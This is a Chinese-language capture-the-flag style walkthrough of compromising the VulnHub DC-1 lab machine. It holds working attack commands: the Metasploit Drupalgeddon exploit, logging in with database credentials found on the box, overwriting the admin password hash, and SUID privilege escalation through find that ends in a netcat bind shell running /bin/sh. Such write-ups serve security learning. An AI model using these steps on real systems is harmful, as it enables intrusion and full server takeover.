vulnhub之DC-1靶机攻击详细过程
2022-01-22 13:57:47

首先nmap扫C段

nmap 192.168.26.0/24


发现靶机IP地址 192.168.26.129 以及开放的端口

接下来nmap 扫一下详细的信息

访问80端口，发现是一套CMS，网上搜索该cms发现漏洞，接下来利用msf

msfconsole
search drupal
use  exploit/multi/http/drupal_drupageddon
show options
set rhosts 192.168.26.129
set rport 80
set TARGETURI   http://192.168.26.129/
exploit


成功获取到会话

ls 发现flag1.txt成功读取到flag1.txt的内容

根据提示然后到处看看，看看能不能找到网站配置文件 然后在/var/www/sites/default 目录下的settings.php中获取到了flag2，同时拿到了数据库账号和密码

mysql -udbuser -pR0ck3t        # 登录数据库 —》查看数据
show databases;
use drupaldb;
show tables;
select * from users;


我们可以看见用户名为admin的账户，并且看到其密码，但是已经被加密过。

尝试发现密码的加密规则，新开一个终端窗口输入hash-identifier 查询密码的加密方式

发现查询不到，网上搜索发现 drupalCMS可以使用password-hash.sh文件来生成此种加密的结果。

发现/var/www/scripts/password-hash.sh 来到scripts文件进行调用，此处调用不成功，回到www目录下，然后运行

scripts/password-hash.sh 123456 得到加密结果

password: 123456 hash: $S$DqmSfBfFUmIoobomWlB45XSI7MG..o9y9zzUQEc2xGzYXgxfnM19

回到数据库中，将密码进行替换

update users set pass='$S$DqmSfBfFUmIoobomWlB45XSI7MG..o9y9zzUQEc2xGzYXgxfnM19' where uid=1;

更新完成之后，在网页登录,登录之后发现flag3

使用find命令发现第四个flag

上传信息搜集脚本

信息搜集脚本下载链接：https://github.com/rebootuser/LinEnum

meterpreter > LinEnum.sh      192.168.26.129  /tmp        #上传信息搜集脚本
meterpreter > cd /tmp
meterpreter > shell
chmod 777 LinEnum.sh
./LinEnum                          #运行信息搜集脚本


使用信息搜集脚本发现，可以使用suid 利用find提权

python -c 'import pty;pty.spawn("/bin/bash")'      #使用python获取交互式shell，实际上也就是模拟了一个虚拟终端


接下来开始使用find进行提取

touch test
find test -exec whoami \;
find te -exec netcat -lvp 5556 -e /bin/sh \;        //在被攻击服务器上执行该命令 监听本地5555端口，用于入站连接
netcat xx.xx.xx.xx 5556                                     //   自己服务器上  使用nc  输入对方ip和端口，去连接，从而获得一个root权限的shell


到此五个flag都拿到了，DC-1的打靶过程到这里就算完成了。
